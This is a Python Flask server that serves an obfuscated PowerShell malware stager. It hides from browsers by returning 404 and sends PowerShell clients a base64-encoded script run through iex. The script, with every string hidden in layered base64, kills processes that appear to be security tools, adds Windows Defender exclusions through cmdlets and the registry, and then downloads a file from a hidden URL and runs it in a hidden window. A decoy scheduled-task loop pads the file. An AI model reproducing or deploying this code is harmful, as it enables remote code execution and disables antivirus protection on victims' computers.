from flask import Flask, Response, request
import base64
import os

app = Flask(__name__)

@app.route('/')
def direct_command():
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # Stealth: 404 for browsers
    if 'mozilla' in user_agent and 'powershell' not in user_agent:
        return Response("Not Found", status=404)

    # Obfuscated PowerShell Logic
    # We use variable fragmentation and backticks to hide keywords
    raw_script = """
$CurrENTPriNciPaL = new-ObjeCT sECurity.PRINciPAL.WINdOwSPRInCipAL([SECuRitY.PriNcIPal.WiNdowSiDEntITY]::gEtcURrent())
if ($CURrenTPrInCipAL.IsINrolE([SECURitY.PrInCiPAl.WInDowsBUiltINROlE]::AdmiNiStrATOR)) {
    WRITE-HoSt ([SySTEm.teXt.EnCoding]::UTf8.getSTring([syStem.COnveRT]::fRoMBase64STRIng(([sYstEM.TExT.eNcODIng]::uTf8.gETStrING([sySTem.CoNVErT]::frOmBaSE64STrINg(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VEZNd2RFbEZjRUpUVlhoRFZXdFdRbE41TUhoUGFVSkNVVEZTU2xaclZXZE1VekIw'))))))))) -FOReGrOundcOlOR GrEEn
    
    # 1. kiLl bACkgRouND gUArdS
    $pROCS = @(([SYstEm.TeXT.EnCoDINg]::utf8.geTSTrINg([SyStEM.ConvErt]::frOMbASe64StRinG(([sYSTEm.tEXT.ENcOdING]::Utf8.geTsTRIng([SyStem.coNVErT]::FrOMBAsE64StRing(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VVZoYWFHTXpVbFpUVVQwOQ=='))))))))), ([sYSTem.TEXt.ENcoDiNg]::UTF8.geTStrIng([sYSTEM.CoNVert]::fRomBasE64STRing(([SYSteM.text.ENCodInG]::utF8.GETSTrIng([SYStEM.ConveRT]::FRomBAse64sTRiNG(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VVZoYWFHTXpVbFJrYlUwOQ=='))))))))), ([system.teXT.EnCOdING]::UTf8.getStRIng([sysTem.COnveRt]::fRomBaSE64stRINg(([SysTem.TEXT.EncODinG]::UTF8.GeTStRiNg([System.cONverT]::fRoMbasE64STriNG(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VlRJeGFGcEhSakk9'))))))))), ([SystEM.TeXt.eNCODing]::Utf8.geTStrInG([syStEM.coNVERt]::fRoMbaSe64STriNG(([SYSTem.teXt.eNcoDiNG]::utF8.getString([SysTEM.coNVert]::FROMbASE64sTriNG(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VlRBeFFsSkZSbGM9'))))))))), ([sYSTeM.TEXT.EncoDING]::utf8.gEtStrINg([sySTem.CoNVERT]::FRomBAse64stRiNG(([SYSTEm.TEXt.EncOdInG]::UtF8.GETStRInG([sYstem.conVerT]::frOmbaSe64sTriNg(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V1RKNGNGcFhOVEJZZWtWMw=='))))))))))
    foreach ($P in $proCS) { tAsKKiLl /F /IM ($P + ([SYStEm.texT.eNcODiNg]::uTF8.GetstriNg([sYSTEm.convERt]::FrOmbAse64strING(([sYsTEM.TEXT.enCodiNg]::uTF8.GetStrING([SysteM.converT]::frombaSE64StRiNG(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VEcxV05GcFJQVDA9')))))))))) /T (64 -bxor 66)>$nULL }

    # 2. advANcED excluSION MeThOd
    $PaTH = ($HOme + ([systEM.TExT.ENcOdiNg]::utf8.GetsTRIng([SystEM.coNVerT]::frOmbASE64STrINg(([sySTem.TEXT.eNCOdinG]::utF8.gEtSTRiNG([SYstem.coNVeRT]::fRoMBaSE64stRInG(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V0VaNGFtSkhiR3hpYmxKbVRWUkJkVnBZYUd3PQ=='))))))))))
    wrITe-hoSt ([sysTEM.tExT.enCoDINg]::utF8.getStriNG([syStEm.convERT]::frOmbASE64sTrInG(([sysTEm.texT.ENcodinG]::utF8.GeTSTRIng([SYSTeM.COnVERT]::FRoMbaSE64sTRing(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VjNsMFpFbEZTalZqUjBaNll6SnNkVnA1UW5wYVYwNHhZMjFzTUdWVFFuTlpXR3hzWTI1TmRVeHBORDA9'))))))))) -fOrEgRounDCOloR cYAn
    
    # METHod a: STanDArd pOWErshELl ExCLusION
    aDd-MpPRefERENce -ExCLUsIoNpAth $patH -erRoRaCTioN SILeNtlYcOntiNue
    add-MpPrEFerENcE -eXclUsiONPATH $hOmE -ERrorAcTION sileNtlYCOnTInue
    
    # methoD B: fOrce via reGiStrY (OfteN bYpASSES TaMpeR PRotEcTiON UI BLoCks)
    try {
        $Regpath = ([sySTEM.TExT.EncodINg]::UTf8.geTSTrIng([SySteM.ConverT]::FroMBASE64STrinG(([sYSTEm.TeXt.encOdiNg]::Utf8.GETsTRINg([SysTEM.COnvert]::FrOmBaSe64StRiNG(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VTBWMFRWUlVjR05ZUms1UVVteFNXRkZXU2taWVJuaE9ZVmRPZVdJelRuWmFibEpqV0Vaa2NHSnRVblprTTAxblVrZFdiVnBYTld0YVdFcGpXRVZXTkZreWVERmpNbXgyWW01T1kxaEdRbWhrUjJoNg==')))))))))
        if (test $regpaTH) {
            NeW-iTEmPROperTy -paTH $REgPATh -NAME $pAth -VAlUe (38 -bxor 38) -PROPErtytyPE dWOrd -FoRCe -ErrorACtIoN sileNtLYCONtiNUe
        }
    } catch {}

    # 3. DEPlOYmENt wITh reTrY lOGIC
    sTArT-Job -ScRIPTBlOCK {
        param($P)
        $URL = ([syStEM.tEXt.ENcOdIng]::utF8.gEtStrinG([sySTEM.CoNVERT]::froMBAsE64STrING(([systeM.Text.EnCODiNg]::UTF8.GetstRING([syStem.cOnvErt]::FRoMbASe64STRINg(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WVVoU01HTklUVFpNZVRsdVlWaFNiMlJYU1hWWk1qbDBUREp3YkdKWFNteGxRemxWWWpOQmRGSnRPWE5pUnpreldsaEtla3d6U21oa2VUbDVXbGRhZWt3eWFHeFpWMUo2VERJeGFHRlhOSFpaTW5od1dsYzFNRmg2UlhkTWJWWTBXbEU5UFE9PQ==')))))))))
        for ($I = (62 + -62); $i -lt (27 - 24); $I++) {
            try {
                if (!(test $P)) {
                    (new sYSTeM.neT.WEbcLIenT).downloAdfiLe($URl, $p)
                }
                if (test $P) { 
                    saps $P -wiNdowstYLe hIdden
                    break 
                }
            } catch { Start-sleep -SECoNdS (-64 + 69) }
        }
    } -argumEnTlISt $paTh
    
    wRIte-hoSt ([SystEm.TEXt.enCODiNg]::utF8.GeTSTrIng([sysTeM.COnVErT]::fRoMBAse64StrinG(([SYsTEm.TeXT.ENCoDING]::utf8.geTSTRInG([sySTEm.CoNVErT]::frOmBASE64StriNG(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VjNsMFpFbEZTbWhaTW5SdVkyMDVNV0p0VVdkYVIxWjNZa2M1TldKWFZuVmtRMEp0WVZjMWFHSkhiRFphVjFGMQ=='))))))))) -FOrEGROuNDColOR gReEn
}
while ($false) {
    Register-ScheduledTask -TaskName "MaintenanceTask49" -Action { Write-Host "Simulated task run" } -Trigger (New-TimeSpan -Minutes 51) -Principal $(whoami) -RunLevel Limited -ErrorAction Ignore
}
"""
    # Double-layer scrambling: First fragment, then Base64
    encoded_bytes = base64.b64encode(raw_script.encode('utf-8'))
    scrambled_logic = encoded_bytes.decode('utf-8')
    
    # Final payload that decodes the fragmented script
    ps_payload = f"$s=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{scrambled_logic}')); iex $s"

    return Response(ps_payload, mimetype='text/plain')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
